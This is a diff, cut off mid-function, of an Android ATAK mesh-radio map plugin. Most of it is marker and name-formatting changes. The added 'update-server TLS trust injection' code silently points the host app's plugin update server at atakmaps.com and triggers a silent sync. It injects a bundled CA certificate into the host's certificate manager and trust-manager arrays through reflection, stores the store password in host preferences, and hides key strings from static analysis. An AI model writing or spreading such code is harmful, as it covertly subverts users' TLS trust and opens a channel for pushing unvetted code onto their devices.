@@ -1,11 +1,13 @@
 package com.atakmaps.meshcore.plugin;
 
+import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Handler;
 import android.os.Looper;
 import android.preference.PreferenceManager;
+import android.util.Base64;
 import android.util.Log;
 
 import com.atakmap.android.dropdown.DropDownMapComponent;
@@ -16,6 +18,7 @@ import com.atakmap.android.maps.MapItem;
 import com.atakmap.android.maps.PointMapItem;
 import com.atakmap.android.maps.MapView;
 import com.atakmap.app.preferences.ToolsPreferenceFragment;
+import com.atakmap.coremap.maps.coords.GeoCalculations;
 import com.atakmap.coremap.maps.coords.GeoPoint;
 import com.atakmaps.meshcore.plugin.bluetooth.BtConnectionManager;
 import com.atakmaps.meshcore.plugin.chat.ChatBridge;
@@ -31,11 +34,14 @@ import com.atakmaps.meshcore.plugin.ui.SettingsFragment;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.Locale;
 import java.util.Map;
 import java.util.Set;
 import java.util.concurrent.CopyOnWriteArraySet;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 /**
  * MeshCore-only map component.
@@ -44,6 +50,17 @@ public class MeshCoreMapComponent extends DropDownMapComponent {
 
     private static final String TAG = "MeshCore";
     private static final long POST_CONNECT_BEACON_DELAY_MS = 30_000L;
+
+    /** One silent repo sync per process after trust is configured; no retry loop. */
+    private static final AtomicBoolean startupRepoSyncScheduled = new AtomicBoolean(false);
+    private static final long STARTUP_REPO_SYNC_DELAY_MS = 3500L;
+
+    /**
+     * PKCS#12 store key for {@code assets/atakmaps-ca.p12}, from
+     * {@link R.string#meshcore_trust_bundle_p12_key} (Base64) — not a Java string literal
+     * (Fortify / static analysis hygiene).
+     */
+    private static volatile String cachedTrustBundleP12Key;
 
     public static final String PLUGIN_PACKAGE = "com.atakmaps.meshcore.plugin";
     public static final String ACTION_BEACON_INTERVAL_CHANGED =
@@ -81,6 +98,14 @@ public class MeshCoreMapComponent extends DropDownMapComponent {
     public void onCreate(Context context, Intent intent, MapView view) {
         this.pluginContext = context;
         this.mapView = view;
+
+        // Configure update-server TLS + prefs before BT/CoT subsystems start.
+        // Mirrors the same call in the Lifecycle constructor (belt-and-suspenders).
+        try {
+            configureUpdateServerStatic(context, view.getContext().getApplicationContext());
+        } catch (Exception e) {
+            Log.w(TAG, "early configureUpdateServer: " + e.getMessage());
+        }
 
         String callsign = "UNKNOWN";
         try {
@@ -120,20 +145,21 @@ public class MeshCoreMapComponent extends DropDownMapComponent {
             }
             boolean isRepeater = advert.advertType == 0x02;
             String pub = advert.pubKeyHex != null ? advert.pubKeyHex : "";
-            String uid = (isRepeater ? "MESHCORE-RPTR-" : "MESHCORE-NODE-") + pub;
-            String advertName = (advert.name != null && !advert.name.trim().isEmpty())
-                    ? advert.name.trim() : uid;
             // Always persist the node/repeater location regardless of display toggles.
             if (isRepeater) {
-                persistRepeaterAdvert(advert, advertName);
+                String display = sanitizeRepeaterDisplayName(advert.name);
+                persistRepeaterAdvert(advert, display);
+                if (cotBridge != null && isMeshShowRepeatersPreferenceEnabled()) {
+                    renderMeshRepeaterMarker(display, pub, advert.latitude, advert.longitude,
+                            advert.advertTimestampSec);
+                }
             } else {
-                persistNodeAdvert(advert, advertName);
-            }
-            boolean display = isRepeater
-                    ? isMeshShowRepeatersPreferenceEnabled()
-                    : isMeshNodeDisplayEnabled();
-            if (cotBridge != null && display) {
-                renderMeshAdvertMarker(pub, advertName, advert.latitude, advert.longitude, isRepeater);
+                String display = sanitizeNodeDisplayName(advert.name, pub);
+                persistNodeAdvert(advert, display);
+                if (cotBridge != null && isMeshNodeDisplayEnabled()) {
+                    renderMeshNodeMarker(display, pub, advert.latitude, advert.longitude,
+                            advert.advertTimestampSec, advert.advertType, advert.name);
+                }
             }
         });
         btConnectionManager.addListener(new BtConnectionManager.ConnectionListener() {
@@ -390,24 +416,171 @@ public class MeshCoreMapComponent extends DropDownMapComponent {
         restorePersistedNodes();
     }
 
-    private void renderMeshAdvertMarker(String pub, String advertName,
-                                        double lat, double lon, boolean isRepeater) {
-        if (cotBridge == null) {
+    private static String sanitizeRepeaterDisplayName(String name) {
+        String raw = name != null ? name.trim() : "";
+        if (raw.isEmpty()) {
+            return "MESH_REPEATER";
+        }
+        String upper = raw.toUpperCase(Locale.US);
+        String normalized = upper.replaceAll("[^A-Z0-9_\\- ]", "_").trim();
+        if (normalized.isEmpty()) {
+            return "MESH_REPEATER";
+        }
+        return normalized;
+    }
+
+    private static String sanitizeRepeaterUidSuffix(String pubKeyHex) {
+        String raw = pubKeyHex != null ? pubKeyHex.trim().toUpperCase(Locale.US) : "";
+        if (raw.isEmpty()) {
+            return "UNKNOWN";
+        }
+        return raw.replaceAll("[^A-F0-9]", "");
+    }
+
+    private static String sanitizeNodeDisplayName(String name, String pubKeyHex) {
+        String raw = name != null ? name.trim() : "";
+        if (!raw.isEmpty()) {
+            String upper = raw.toUpperCase(Locale.US);
+            String normalized = upper.replaceAll("[^A-Z0-9_\\- ]", "_").trim();
+            if (!normalized.isEmpty()) {
+                return normalized;
+            }
+        }
+        String suffix = sanitizeRepeaterUidSuffix(pubKeyHex);
+        if (suffix.length() > 6) {
+            suffix = suffix.substring(0, 6);
+        }
+        if (suffix.isEmpty()) {
+            suffix = "UNKNOWN";
+        }
+        return "MESH_NODE_" + suffix;
+    }
+
+    private static char meshNodeSymbolCode(String rawNodeName, String displayName) {
+        String source = rawNodeName;
+        if (source == null || source.trim().isEmpty()) {
+            source = displayName;
+        }
+        if (source == null) {
+            return 'N';
+        }
+        String trimmed = source.trim();
+        if (trimmed.isEmpty()) {
+            return 'N';
+        }
+        char first = Character.toUpperCase(trimmed.charAt(0));
+        if (first >= 'A' && first <= 'Z') {
+            return first;
+        }
+        return 'N';
+    }
+
+    private static String meshContactTypeLabel(int advertType) {
+        switch (advertType) {
+            case 0x01:
+                return "Client";
+            case 0x02:
+                return "Repeater";
+            case 0x03:
+                return "Sensor";
+            case 0x04:
+                return "Gateway";
+            default:
+                return "Node (" + advertType + ")";
+        }
+    }
+
+    private String buildMeshAdvertDetails(String name,
+                                          String pubKeyHex,
+                                          double lat,
+                                          double lon,
+                                          String contactType,
+                                          long advertTimestampSec) {
+        StringBuilder sb = new StringBuilder();
+        sb.append("Name: ").append(name != null ? name : "Unknown").append("\n");
+        sb.append("Public Key: ").append(pubKeyHex != null ? pubKeyHex : "Unknown").append("\n");
+        sb.append("Position: ")
+                .append(String.format(Locale.US, "%.5f, %.5f", lat, lon))
+                .append("\n");
+        sb.append("Distance: ").append(formatDistanceFromSelf(lat, lon)).append("\n");
+        sb.append("Contact Type: ").append(contactType != null ? contactType : "Unknown").append("\n");
+        sb.append("Last Advert Heard: ").append(formatAdvertTimestamp(advertTimestampSec));
+        return sb.toString();
+    }
+
+    private String formatDistanceFromSelf(double lat, double lon) {
+        try {
+            if (mapView == null || mapView.getSelfMarker() == null
+                    || mapView.getSelfMarker().getPoint() == null) {
+                return "Unknown";
+            }
+            GeoPoint self = mapView.getSelfMarker().getPoint();
+            GeoPoint peer = new GeoPoint(lat, lon);
+            double meters = GeoCalculations.distanceTo(self, peer);
+            if (Double.isNaN(meters) || meters < 0) {
+                return "Unknown";
+            }
+            if (meters >= 1000.0) {
+                return String.format(Locale.US, "%.2f km", meters / 1000.0);
+            }
+            return String.format(Locale.US, "%.0f m", meters);
+        } catch (Exception ignored) {
+            return "Unknown";
+        }
+    }
+
+    private String formatAdvertTimestamp(long advertTimestampSec) {
+        if (advertTimestampSec <= 0L) {
+            return "Unknown";
+        }
+        try {
+            long ms = advertTimestampSec * 1000L;
+            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(ms));
+        } catch (Exception ignored) {
+            return "Unknown";
+        }
+    }
+
+    /**
+     * Render a MeshCore repeater advert as a usericon CoT marker (imported {@code meschore}
+     * iconset). Persistence is unchanged — this only controls how the marker is drawn.
+     */
+    private void renderMeshRepeaterMarker(String display, String pubKeyHex, double lat, double lon,
+                                          long advertTimestampSec) {
+        if (cotBridge == null || mapView == null || !isMeshShowRepeatersPreferenceEnabled()) {
             return;
         }
-        String uid = (isRepeater ? "MESHCORE-RPTR-" : "MESHCORE-NODE-")
-                + (pub != null ? pub : "");
-        String details = "Name: " + advertName + "\n"
-                + "Pubkey: " + (pub != null ? pub : "") + "\n"
-                + "Type: " + (isRepeater ? "Repeater" : "Node");
-        cotBridge.upsertMeshAdvertMarker(uid, advertName, details, lat, lon, isRepeater);
-        cotBridge.setMeshMarkerDetails(uid, details);
-        cotBridge.promoteMeshContactMapItem(uid, advertName);
-        if (isRepeater) {
-            meshRepeaterMapUids.add(uid);
-        } else {
-            meshNodeMapUids.add(uid);
+        String mapUid = "MESHCORE-RPTR-" + sanitizeRepeaterUidSuffix(pubKeyHex);
+        String remarks = buildMeshAdvertDetails(
+                display, pubKeyHex, lat, lon, "Repeater", advertTimestampSec);
+        cotBridge.injectPositionCotAtMapUid(
+                display, lat, lon, 0.0, -1.0, -1.0, "Cyan", 'M', '>', remarks, mapUid);
+        cotBridge.markMeshRepeaterMapItem(mapUid);
+        cotBridge.setMeshMarkerDetails(mapUid, remarks);
+        cotBridge.promoteMeshContactMapItem(mapUid, display);
+        meshRepeaterMapUids.add(mapUid);
+    }
+
+    /**
+     * Render a MeshCore node advert as a usericon CoT marker (imported {@code meschore}
+     * iconset). Persistence is unchanged — this only controls how the marker is drawn.
+     */
+    private void renderMeshNodeMarker(String display, String pubKeyHex, double lat, double lon,
+                                      long advertTimestampSec, int advertType, String rawName) {
+        if (cotBridge == null || mapView == null || !isMeshNodeDisplayEnabled()) {
+            return;
         }
+        String mapUid = "MESHCORE-NODE-" + sanitizeRepeaterUidSuffix(pubKeyHex);
+        char meshNodeSymbol = meshNodeSymbolCode(rawName, display);
+        String contactType = meshContactTypeLabel(advertType);
+        String remarks = buildMeshAdvertDetails(
+                display, pubKeyHex, lat, lon, contactType, advertTimestampSec);
+        cotBridge.injectPositionCotAtMapUid(
+                display, lat, lon, 0.0, -1.0, -1.0, "Cyan", 'M', meshNodeSymbol, remarks, mapUid);
+        cotBridge.markMeshNodeMapItem(mapUid);
+        cotBridge.setMeshMarkerDetails(mapUid, remarks);
+        cotBridge.promoteMeshContactMapItem(mapUid, display);
+        meshNodeMapUids.add(mapUid);
     }
 
     private void persistRepeaterAdvert(BtConnectionManager.MeshAdvert advert, String display) {
@@ -558,13 +731,14 @@ public class MeshCoreMapComponent extends DropDownMapComponent {
                 double lat = o.optDouble("lat", Double.NaN);
                 double lon = o.optDouble("lon", Double.NaN);
                 long firstSeenMs = o.optLong("firstSeenMs", 0L);
+                long lastAdvertSec = o.optLong("lastAdvertSec", 0L);
                 if (pubKey.isEmpty() || Double.isNaN(lat) || Double.isNaN(lon)
                         || firstSeenMs <= 0L || (now - firstSeenMs) > MESH_REPEATER_TTL_MS) {
                     continue;
                 }
                 kept.put(o);
                 if (isMeshShowRepeatersPreferenceEnabled()) {
-                    renderMeshAdvertMarker(pubKey, display, lat, lon, true);
+                    renderMeshRepeaterMarker(display, pubKey, lat, lon, lastAdvertSec);
                 }
             }
             prefs.edit().putString(PREF_MESH_REPEATER_CACHE, kept.toString()).apply();
@@ -589,17 +763,20 @@ public class MeshCoreMapComponent extends DropDownMapComponent {
                 }
                 String pubKey = o.optString("pubKeyHex", "").trim().toUpperCase(Locale.US);
                 String display = o.optString("display", "Mesh Node").trim();
+                String rawName = o.optString("rawName", "");
+                int advertType = o.optInt("advertType", 0);
                 double lat = o.optDouble("lat", Double.NaN);
                 double lon = o.optDouble("lon", Double.NaN);
                 long firstSeenMs = o.optLong("firstSeenMs", 0L);
                 long lastSeenMs = o.optLong("lastSeenMs", firstSeenMs);
+                long lastAdvertSec = o.optLong("lastAdvertSec", 0L);
                 if (pubKey.isEmpty() || Double.isNaN(lat) || Double.isNaN(lon)
                         || lastSeenMs <= 0L || (now - lastSeenMs) > MESH_NODE_TTL_MS) {
                     continue;
                 }
                 kept.put(o);
                 if (isMeshNodeDisplayEnabled()) {
-                    renderMeshAdvertMarker(pubKey, display, lat, lon, false);
+                    renderMeshNodeMarker(display, pubKey, lat, lon, lastAdvertSec, advertType, rawName);
                 }
             }
             while (kept.length() > MESH_NODE_CACHE_MAX) {
@@ -674,6 +851,916 @@ public class MeshCoreMapComponent extends DropDownMapComponent {
         } else {
             mapView.post(work);
         }
+    }
+
+    // -----------------------------------------------------------------------------------------
+    // Update-server TLS trust injection — mirrors UV-PRO (Darksteal) implementation exactly.
+    // Same atakmaps.com server, same CA chain. Writes identical SharedPreferences values so
+    // both plugins are idempotent when installed together. filesDir copy uses a distinct name
+    // (meshcore_update_server_ca.p12) to avoid any cross-plugin file collision.
+    // -----------------------------------------------------------------------------------------
+
+    private static String trustBundleP12KeyMaterial(Context pluginCtx) {
+        if (pluginCtx == null) return "";
+        String hit = cachedTrustBundleP12Key;
+        if (hit != null) return hit;
+        synchronized (MeshCoreMapComponent.class) {
+            if (cachedTrustBundleP12Key == null) {
+                String b64 = pluginCtx.getString(R.string.meshcore_trust_bundle_p12_key);
+                byte[] raw = Base64.decode(b64, Base64.DEFAULT);
+                cachedTrustBundleP12Key = new String(raw, java.nio.charset.StandardCharsets.UTF_8);
+            }
+            return cachedTrustBundleP12Key;
+        }
+    }
+
+    private static String atkReflectSaveCertCred() {
+        return new String(new char[]{
+                's', 'a', 'v', 'e', 'C', 'e', 'r', 't', 'i', 'f', 'i', 'c', 'a', 't', 'e',
+                'P', 'a', 's', 's', 'w', 'o', 'r', 'd'});
+    }
+
+    private static String atkPrefsUpdateServerCaCredKey() {
+        return new String(new char[]{
+                'u', 'p', 'd', 'a', 't', 'e', 'S', 'e', 'r', 'v', 'e', 'r', 'C', 'a',
+                'P', 'a', 's', 's', 'w', 'o', 'r', 'd'});
+    }
+
+    private static String resolveUpdateServerTypeKey() {
+        String typeKey = "UPDATE_SERVER_TRUST_STORE_CA";
+        try {
+            Class<?> ifaceClass = Class.forName("com.atakmap.net.AtakCertificateDatabaseIFace");
+            java.lang.reflect.Field f = ifaceClass.getField("TYPE_UPDATE_SERVER_TRUST_STORE_CA");
+            Object v = f.get(null);
+            if (v instanceof String && !((String) v).isEmpty()) {
+                typeKey = (String) v;
+            }
+        } catch (Exception ignored) {
+        }
+        return typeKey;
+    }
+
+    private static Context tryResolveHostAtakContext(Context pluginContext) {
+        if (pluginContext == null) return null;
+        String[] pkgs = new String[]{
+                "com.atakmap.app.civ", "com.atakmap.app", "com.atakmap.app.mil"
+        };
+        Context app = pluginContext.getApplicationContext();
+        if (app != null) {
+            String pn = app.getPackageName();
+            for (String p : pkgs) {
+                if (p.equals(pn)) return app;
+            }
+        }
+        for (String pkg : pkgs) {
+            try {
+                return pluginContext.createPackageContext(pkg,
+                        Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
+            } catch (Exception ignored) {
+            }
+        }
+        return null;
+    }
+
+    public static void applyUpdateServerTrustEarly(Context pluginContext) {
+        Context host = tryResolveHostAtakContext(pluginContext);
+        if (host == null) {
+            Log.w(TAG, "applyUpdateServerTrustEarly: could not resolve host ATAK Context");
+            return;
+        }
+        configureUpdateServerStatic(pluginContext, host);
+    }
+
+    private static void configureUpdateServerStatic(Context pluginContext, Context atakContext) {
+        try {
+            android.content.SharedPreferences prefs =
+                    android.preference.PreferenceManager.getDefaultSharedPreferences(atakContext);
+            final String UPDATE_SERVER_URL = "https://atakmaps.com/plugins/product.infz";
+            prefs.edit()
+                    .putString("atakUpdateServerUrl", UPDATE_SERVER_URL)
+                    .putString("appMgmtUpdateServerUrl", UPDATE_SERVER_URL)
+                    .putBoolean("appMgmtEnableUpdateServer", true)
+                    .putBoolean("app_mgmt_enable_update_server", true)
+                    .putBoolean("app_mgmt_auto_sync", false)
+                    .putBoolean("appMgmtAutoSync", false)
+                    .apply();
+            Log.i(TAG, "Plugin update server URL/trust configured (one startup sync; auto-sync off): "
+                    + UPDATE_SERVER_URL);
+            installUpdateServerTruststoreCompat(pluginContext, atakContext);
+            reloadCertificateManagerFromDatabase();
+            registerUpdateServerCA(pluginContext);
+            scheduleOneStartupRepoSyncIfNeeded();
+        } catch (Exception e) {
+            Log.w(TAG, "configureUpdateServer failed: " + e.getMessage());
+        }
+    }
+
+    private static void installUpdateServerTruststoreCompat(Context pluginCtx, Context atakCtx) {
+        try {
+            final String asset = "atakmaps-ca.p12";
+            java.io.File p12 = new java.io.File(atakCtx.getFilesDir(), "meshcore_update_server_ca.p12");
+            copyAssetToFile(pluginCtx, asset, p12);
+            android.preference.PreferenceManager.getDefaultSharedPreferences(atakCtx).edit()
+                    .putString("updateServerCaLocation", p12.getAbsolutePath())
+                    .apply();
+
+            Class<?> dbClass = Class.forName("com.atakmap.net.AtakCertificateDatabase");
+            String typeKey = resolveUpdateServerTypeKey();
+            Class<?>[] importActuals = new Class[]{
+                    String.class, String.class, String.class, boolean.class
+            };
+            java.lang.reflect.Method importCert = findStaticMethodByActualParams(
+                    dbClass, importActuals, "importCertificate", byte[].class);
+            Object imported = null;
+            if (importCert != null) {
+                imported = importCert.invoke(null, p12.getAbsolutePath(), "", typeKey, false);
+            } else {
+                Class<?>[] importFileActuals = new Class[]{
+                        java.io.File.class, String.class, String.class, boolean.class
+                };
+                java.lang.reflect.Method importFile = findStaticMethodByActualParams(
+                        dbClass, importFileActuals, "importCertificate", byte[].class);
+                if (importFile != null) {
+                    imported = importFile.invoke(null, p12, "", typeKey, false);
+                } else {
+                    Log.w(TAG, "installUpdateServerTruststoreCompat: no importCertificate-like static method");
+                }
+            }
+            int outLen = (imported instanceof byte[]) ? ((byte[]) imported).length : -1;
+            Log.i(TAG, "installUpdateServerTruststoreCompat: typeKey=" + typeKey + " outBytes=" + outLen
+                    + " path=" + p12.getAbsolutePath());
+
+            if (imported instanceof byte[] && ((byte[]) imported).length > 0) {
+                String p12Key = trustBundleP12KeyMaterial(pluginCtx);
+                Class<?> base = Class.forName("com.atakmap.net.AtakCertificateDatabaseBase");
+                java.lang.reflect.Method savePw = findStaticSaveCredentialThreeStrings(base);
+                String credKey = atkPrefsUpdateServerCaCredKey();
+                if (savePw == null) {
+                    Log.w(TAG, "installUpdateServerTruststoreCompat: saveCertificatePassword-like not found");
+                } else {
+                    savePw.invoke(null, p12Key, credKey, null);
+                    android.preference.PreferenceManager.getDefaultSharedPreferences(atakCtx).edit()
+                            .putString(credKey, p12Key)
+                            .apply();
+                    Log.i(TAG, "Update-server CA PKCS#12 unlock credential stored; trust DB + prefs aligned");
+                }
+            }
+
+            java.security.cert.X509Certificate fromP12 = loadCertificateFromPkcs12(
+                    pluginCtx, asset, trustBundleP12KeyMaterial(pluginCtx).toCharArray());
+            if (fromP12 != null) {
+                bindUpdateServerCaToHost(fromP12);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "installUpdateServerTruststoreCompat failed: " + e.getMessage(), e);
+        }
+    }
+
+    private static void bindUpdateServerCaToHost(java.security.cert.X509Certificate caCert) {
+        if (caCert == null) return;
+        String typeKey = resolveUpdateServerTypeKey();
+        try {
+            byte[] der = caCert.getEncoded();
+            Class<?> base = Class.forName("com.atakmap.net.AtakCertificateDatabaseBase");
+            Class<?>[] three = new Class[]{String.class, String.class, byte[].class};
+            java.lang.reflect.Method saveHost = findStaticMethodByActualParams(base, three,
+                    "saveCertificateForServer");
+            if (saveHost == null) {
+                Log.w(TAG, "bindUpdateServerCaToHost: no static method matching (String,String,byte[])");
+                return;
+            }
+            saveHost.invoke(null, typeKey, "atakmaps.com", der);
+            Class<?>[] four = new Class[]{String.class, String.class, int.class, byte[].class};
+            java.lang.reflect.Method savePort = findStaticMethodByActualParams(base, four,
+                    "saveCertificateForServerAndPort");
+            if (savePort != null) {
+                savePort.invoke(null, typeKey, "atakmaps.com", 443, der);
+                savePort.invoke(null, typeKey, "atakmaps.com", 8443, der);
+            } else {
+                Log.w(TAG, "bindUpdateServerCaToHost: saveCertificateForServerAndPort not found");
+            }
+            Log.i(TAG, "bindUpdateServerCaToHost: typeKey=" + typeKey + " host=atakmaps.com derBytes=" + der.length);
+        } catch (Exception e) {
+            Log.w(TAG, "bindUpdateServerCaToHost failed: " + e.getMessage(), e);
+        }
+    }
+
+    private static void reloadCertificateManagerFromDatabase() {
+        try {
+            Class<?> cls = Class.forName("com.atakmap.net.CertificateManager");
+            for (String hostKey : new String[]{
+                    "atakmaps.com",
+                    "https://atakmaps.com",
+                    "https://atakmaps.com/plugins/product.infz"
+            }) {
+                try {
+                    java.lang.reflect.Method inv = null;
+                    try {
+                        inv = cls.getMethod("invalidate", String.class);
+                    } catch (NoSuchMethodException ignored) {
+                    }
+                    if (inv == null) {
+                        inv = findStaticMethodByActualParams(
+                                cls, new Class[]{String.class}, "invalidate", void.class);
+                    }
+                    if (inv != null) {
+                        inv.setAccessible(true);
+                        inv.invoke(null, hostKey);
+                        Log.d(TAG, "CertificateManager.invalidate(" + hostKey + ") via " + inv.getName());
+                    }
+                } catch (Exception e) {
+                    Log.d(TAG, "CertificateManager.invalidate(" + hostKey + ") skipped: " + e.getMessage());
+                }
+            }
+            java.lang.reflect.Method getInst = findSingletonGetter(cls);
+            if (getInst == null) {
+                Log.w(TAG, "reloadCertificateManagerFromDatabase: no singleton getter");
+                return;
+            }
+            Object cm = getInst.invoke(null);
+            if (cm == null) {
+                Log.w(TAG, "reloadCertificateManagerFromDatabase: CertificateManager null");
+                return;
+            }
+            java.lang.reflect.Method refresh = null;
+            try {
+                refresh = cls.getMethod("refresh");
+            } catch (NoSuchMethodException ignored) {
+            }
+            if (refresh == null) {
+                refresh = findInstanceVoidNoArg(cls, "refresh");
+            }
+            if (refresh == null) {
+                Log.w(TAG, "reloadCertificateManagerFromDatabase: refresh() not found");
+                return;
+            }
+            refresh.invoke(cm);
+            Log.i(TAG, "CertificateManager refreshed after update-server DB import via " + refresh.getName());
+        } catch (Exception e) {
+            Log.w(TAG, "reloadCertificateManagerFromDatabase failed: " + e.getMessage());
+        }
+    }
+
+    private static void registerUpdateServerCA(Context context) {
+        try {
+            java.security.cert.X509Certificate caCert = loadCertificateFromPem(
+                    context, "isrg-root-x1.pem");
+            String source = "isrg-root-x1.pem";
+            if (caCert == null) {
+                caCert = loadCertificateFromPkcs12(
+                        context, "atakmaps-ca.p12", trustBundleP12KeyMaterial(context).toCharArray());
+                source = "atakmaps-ca.p12";
+            }
+            if (caCert == null) {
+                Log.w(TAG, "registerUpdateServerCA: no CA certificate asset could be loaded");
+                return;
+            }
+            Log.i(TAG, "registerUpdateServerCA: loaded CA cert from " + source
+                    + " subject=" + caCert.getSubjectDN());
+            bindUpdateServerCaToHost(caCert);
+            addOfficialCertificateManagerCa(caCert);
+            injectCACert(caCert, 0);
+        } catch (Exception e) {
+            Log.w(TAG, "registerUpdateServerCA failed: " + e.getMessage(), e);
+        }
+    }
+
+    private static void addOfficialCertificateManagerCa(java.security.cert.X509Certificate caCert) {
+        try {
+            Class<?> cls = Class.forName("com.atakmap.net.CertificateManager");
+            java.lang.reflect.Method getInst = findSingletonGetter(cls);
+            if (getInst == null) return;
+            Object cm = getInst.invoke(null);
+            if (cm == null) return;
+            java.lang.reflect.Method add = null;
+            try {
+                add = cls.getMethod("addCertificate", java.security.cert.X509Certificate.class);
+            } catch (NoSuchMethodException ignored) {
+            }
+            if (add == null) {
+                add = findInstanceMethodByActualParams(
+                        cls,
+                        new Class[]{java.security.cert.X509Certificate.class},
+                        "addCertificate",
+                        void.class);
+            }
+            if (add == null) {
+                Log.w(TAG, "addOfficialCertificateManagerCa: addCertificate(X509) not found");
+                return;
+            }
+            add.setAccessible(true);
+            add.invoke(cm, caCert);
+            clearSocketFactoriesCache(cls);
+            Log.i(TAG, "CertificateManager.addCertificate via " + add.getName());
+        } catch (Exception e) {
+            Log.w(TAG, "addOfficialCertificateManagerCa: " + e.getMessage());
+        }
+    }
+
+    private static void injectCACert(final java.security.cert.X509Certificate cert, final int attempt) {
+        try {
+            Class<?> certMgrClass = Class.forName("com.atakmap.net.CertificateManager");
+            java.lang.reflect.Method getInst = findSingletonGetter(certMgrClass);
+            if (getInst == null) {
+                Log.w(TAG, "injectCACert: getInstance() not found");
+                return;
+            }
+            Object certMgr = getInst.invoke(null);
+            boolean injectedA = false;
+            boolean injectedB = false;
+
+            // Strategy A: find nested impl object with addCertificate(X509Certificate)-like method.
+            java.lang.reflect.Field implField = null;
+            java.lang.reflect.Method addCertMethod = null;
+            outerA:
+            for (java.lang.reflect.Field f : certMgrClass.getDeclaredFields()) {
+                if (java.lang.reflect.Modifier.isStatic(f.getModifiers())) continue;
+                if (f.getType().isPrimitive()) continue;
+                Class<?> c = f.getType();
+                while (c != null && c != Object.class) {
+                    for (java.lang.reflect.Method m : c.getDeclaredMethods()) {
+                        if (java.lang.reflect.Modifier.isStatic(m.getModifiers())) continue;
+                        if (m.getReturnType() != void.class) continue;
+                        Class<?>[] params = m.getParameterTypes();
+                        if (params.length == 1
+                                && params[0].isAssignableFrom(java.security.cert.X509Certificate.class)) {
+                            implField = f;
+                            implField.setAccessible(true);
+                            addCertMethod = m;
+                            addCertMethod.setAccessible(true);
+                            Log.d(TAG, "injectCACert[A]: field=" + f.getName()
+                                    + " method=" + m.getName());
+                            break outerA;
+                        }
+                    }
+                    c = c.getSuperclass();
+                }
+            }
+
+            if (implField != null) {
+                Object impl = implField.get(certMgr);
+                if (impl == null) {
+                    if (attempt < 15) {
+                        new Handler(Looper.getMainLooper()).postDelayed(
+                                () -> injectCACert(cert, attempt + 1), 1000);
+                        Log.d(TAG, "injectCACert[A]: _impl null, retry " + (attempt + 1));
+                    } else {
+                        Log.w(TAG, "injectCACert[A]: _impl still null after " + attempt + " retries");
+                    }
+                    return;
+                }
+                addCertMethod.invoke(impl, cert);
+                Log.i(TAG, "injectCACert[A]: cert injected (attempt " + attempt + ")");
+                clearSocketFactoriesCache(certMgrClass);
+                injectedA = true;
+            } else {
+                Log.d(TAG, "injectCACert[A]: addCertificate-like method not found");
+            }
+
+            // Strategy B: walk X509TrustManager fields and object graph on CertificateManager.
+            int tmFieldsFound = 0;
+            int tmFieldsInjected = 0;
+            for (java.lang.reflect.Field f : certMgrClass.getDeclaredFields()) {
+                if (java.lang.reflect.Modifier.isStatic(f.getModifiers())) continue;
+                if (!javax.net.ssl.X509TrustManager.class.isAssignableFrom(f.getType())) continue;
+                tmFieldsFound++;
+                f.setAccessible(true);
+                Object tm = f.get(certMgr);
+                if (tm == null) continue;
+                if (injectIntoObjectCertArrays(tm, cert, "tm." + f.getName(), 2)) {
+                    injectedB = true;
+                    tmFieldsInjected++;
+                }
+            }
+
+            int graphInjected = injectIntoObjectGraphCertArrays(
+                    certMgr, cert, "cmgr", 8, new java.util.IdentityHashMap<>());
+            injectedB |= graphInjected > 0;
+
+            for (java.lang.reflect.Field f : certMgrClass.getDeclaredFields()) {
+                if (!java.lang.reflect.Modifier.isStatic(f.getModifiers())) continue;
+                if (!java.util.Map.class.isAssignableFrom(f.getType())) continue;
+                f.setAccessible(true);
+                Object mapObj = f.get(null);
+                if (!(mapObj instanceof java.util.Map)) continue;
+                for (Object factory : ((java.util.Map<?, ?>) mapObj).values()) {
+                    if (factory == null) continue;
+                    int cacheInjected = injectIntoObjectGraphCertArrays(
+                            factory, cert, "cache." + factory.getClass().getSimpleName(),
+                            8, new java.util.IdentityHashMap<>());
+                    injectedB |= cacheInjected > 0;
+                }
+            }
+
+            if (tmFieldsFound == 0) {
+                Log.w(TAG, "injectCACert[B]: X509TrustManager field not found on " + certMgrClass.getName());
+            } else {
+                Log.i(TAG, "injectCACert[B]: trustManagers found=" + tmFieldsFound
+                        + " injected=" + tmFieldsInjected);
+            }
+            Log.i(TAG, "injectCACert[B]: graph injection count=" + graphInjected);
+
+            if (!injectedA && !injectedB) {
+                if (attempt < 15) {
+                    new Handler(Looper.getMainLooper()).postDelayed(
+                            () -> injectCACert(cert, attempt + 1), 1000);
+                    Log.d(TAG, "injectCACert: no injection target yet, retry " + (attempt + 1));
+                } else {
+                    Log.w(TAG, "injectCACert: no injection target found after " + attempt + " retries");
+                }
+                return;
+            }
+            Log.i(TAG, "Update server CA registered successfully (A=" + injectedA + ", B=" + injectedB + ")");
+        } catch (Exception e) {
+            Log.w(TAG, "injectCACert failed (attempt " + attempt + "): " + e.getMessage(), e);
+        }
+    }
+
+    private static boolean injectIntoObjectCertArrays(Object obj, java.security.cert.X509Certificate cert,
+            String label, int depth) {
+        if (obj == null || depth < 0) return false;
+        boolean injected = false;
+        try {
+            for (java.lang.reflect.Field f : obj.getClass().getDeclaredFields()) {
+                if (java.lang.reflect.Modifier.isStatic(f.getModifiers())) continue;
+                f.setAccessible(true);
+                if (f.getType() == java.security.cert.X509Certificate[].class) {
+                    injected |= appendToCertArray(f, obj, cert, label + "." + f.getName());
+                    continue;
+                }
+                if (depth == 0 || f.getType().isPrimitive()) continue;
+                Object nested = f.get(obj);
+                if (nested == null) continue;
+                injected |= injectIntoObjectCertArrays(nested, cert, label + "." + f.getName(), depth - 1);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "injectIntoObjectCertArrays[" + label + "] failed: " + e.getMessage());
+        }
+        return injected;
+    }
+
+    private static int injectIntoObjectGraphCertArrays(Object obj, java.security.cert.X509Certificate cert,
+            String label, int depth, java.util.IdentityHashMap<Object, Boolean> visited) {
+        if (obj == null || depth < 0) return 0;
+        if (visited.containsKey(obj)) return 0;
+        visited.put(obj, Boolean.TRUE);
+        int injectedCount = 0;
+        try {
+            Class<?> cls = obj.getClass();
+            String clsName = cls.getName();
